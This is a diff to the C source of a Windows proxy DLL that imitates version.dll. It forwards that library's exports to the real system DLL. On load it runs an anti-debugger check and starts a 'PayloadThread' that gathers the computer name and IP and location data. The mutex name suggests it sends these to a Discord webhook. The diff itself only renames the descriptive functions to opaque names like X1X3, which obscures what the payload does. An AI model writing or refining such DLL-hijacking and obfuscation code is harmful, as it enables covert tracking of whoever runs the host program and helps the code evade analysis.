@@ -57,7 +57,7 @@ static pfnVerQueryValueA pVerQueryValueA = NULL;
 static pfnVerLanguageNameW pVerLanguageNameW = NULL;
 static pfnVerLanguageNameA pVerLanguageNameA = NULL;
 
-BOOL LoadSystemDll() {
+BOOL X1X4() {
     if (g_hOrigDll) return TRUE;
 
     if (IsDebuggerPresent()) {
@@ -97,46 +97,46 @@ BOOL LoadSystemDll() {
 }
 
 __declspec(dllexport) DWORD WINAPI MyGetFileVersionInfoSizeW(LPCWSTR lpwstrFilename, LPDWORD lpdwHandle) {
-    if (!LoadSystemDll() || !pGetFileVersionInfoSizeW) return 0;
+    if (!X1X4() || !pGetFileVersionInfoSizeW) return 0;
     return pGetFileVersionInfoSizeW(lpwstrFilename, lpdwHandle);
 }
 
 __declspec(dllexport) DWORD WINAPI MyGetFileVersionInfoSizeA(LPCSTR lpstrFilename, LPDWORD lpdwHandle) {
-    if (!LoadSystemDll() || !pGetFileVersionInfoSizeA) return 0;
+    if (!X1X4() || !pGetFileVersionInfoSizeA) return 0;
     return pGetFileVersionInfoSizeA(lpstrFilename, lpdwHandle);
 }
 
 __declspec(dllexport) BOOL WINAPI MyGetFileVersionInfoW(LPCWSTR lpwstrFilename, DWORD dwHandle, DWORD dwLen, LPVOID lpData) {
-    if (!LoadSystemDll() || !pGetFileVersionInfoW) return FALSE;
+    if (!X1X4() || !pGetFileVersionInfoW) return FALSE;
     return pGetFileVersionInfoW(lpwstrFilename, dwHandle, dwLen, lpData);
 }
 
 __declspec(dllexport) BOOL WINAPI MyGetFileVersionInfoA(LPCSTR lpstrFilename, DWORD dwHandle, DWORD dwLen, LPVOID lpData) {
-    if (!LoadSystemDll() || !pGetFileVersionInfoA) return FALSE;
+    if (!X1X4() || !pGetFileVersionInfoA) return FALSE;
     return pGetFileVersionInfoA(lpstrFilename, dwHandle, dwLen, lpData);
 }
 
 __declspec(dllexport) BOOL WINAPI MyVerQueryValueW(LPCVOID pBlock, LPCWSTR lpwstrSubBlock, LPVOID *lplpBuffer, PUINT puLen) {
-    if (!LoadSystemDll() || !pVerQueryValueW) return FALSE;
+    if (!X1X4() || !pVerQueryValueW) return FALSE;
     return pVerQueryValueW(pBlock, lpwstrSubBlock, lplpBuffer, puLen);
 }
 
 __declspec(dllexport) BOOL WINAPI MyVerQueryValueA(LPCVOID pBlock, LPCSTR lpstrSubBlock, LPVOID *lplpBuffer, PUINT puLen) {
-    if (!LoadSystemDll() || !pVerQueryValueA) return FALSE;
+    if (!X1X4() || !pVerQueryValueA) return FALSE;
     return pVerQueryValueA(pBlock, lpstrSubBlock, lplpBuffer, puLen);
 }
 
 __declspec(dllexport) DWORD WINAPI MyVerLanguageNameW(DWORD wLang, LPWSTR szLang, DWORD cchLang) {
-    if (!LoadSystemDll() || !pVerLanguageNameW) return 0;
+    if (!X1X4() || !pVerLanguageNameW) return 0;
     return pVerLanguageNameW(wLang, szLang, cchLang);
 }
 
 __declspec(dllexport) DWORD WINAPI MyVerLanguageNameA(DWORD wLang, LPSTR szLang, DWORD cchLang) {
-    if (!LoadSystemDll() || !pVerLanguageNameA) return 0;
+    if (!X1X4() || !pVerLanguageNameA) return 0;
     return pVerLanguageNameA(wLang, szLang, cchLang);
 }
 
-BOOL GetIpInformation(IpInfo* info) {
+BOOL X1X2(IpInfo* info) {
     HINTERNET hSession, hConnect, hRequest;
     BOOL result = FALSE;
     DWORD bytesRead = 0;
@@ -224,7 +224,7 @@ BOOL GetIpInformation(IpInfo* info) {
     return result;
 }
 
-void ExecuteWebhook() {
+void X1X3() {
     HINTERNET hSession, hConnect, hRequest;
     IpInfo ipInfo;
     char computerName[256] = {0};
@@ -238,7 +238,7 @@ void ExecuteWebhook() {
         strcpy(computerName, "Inconnu");
     }
 
-    if (!GetIpInformation(&ipInfo)) {
+    if (!X1X2(&ipInfo)) {
         strcpy(ipInfo.ip, "Inconnu");
         strcpy(ipInfo.country, "Inconnu");
         strcpy(ipInfo.city, "Inconnu");
@@ -318,12 +318,10 @@ void ExecuteWebhook() {
 
 DWORD WINAPI PayloadThread(LPVOID lpParam) {
     Sleep(1000);
-    ExecuteWebhook();
+    X1X3();
     ExitThread(0);
     return 0;
 }
-
-
 
 BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
     if (fdwReason == DLL_PROCESS_ATTACH) {
@@ -333,7 +331,7 @@ BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
         HANDLE mutex = CreateMutexA(NULL, FALSE, "Global\\DiscordPingDLLMutex");
 
         DisableThreadLibraryCalls(hinstDLL);
-        LoadSystemDll();
+        X1X4();
         CreateThread(NULL, 0, PayloadThread, NULL, 0, NULL);
     }
     else if (fdwReason == DLL_PROCESS_DETACH) {
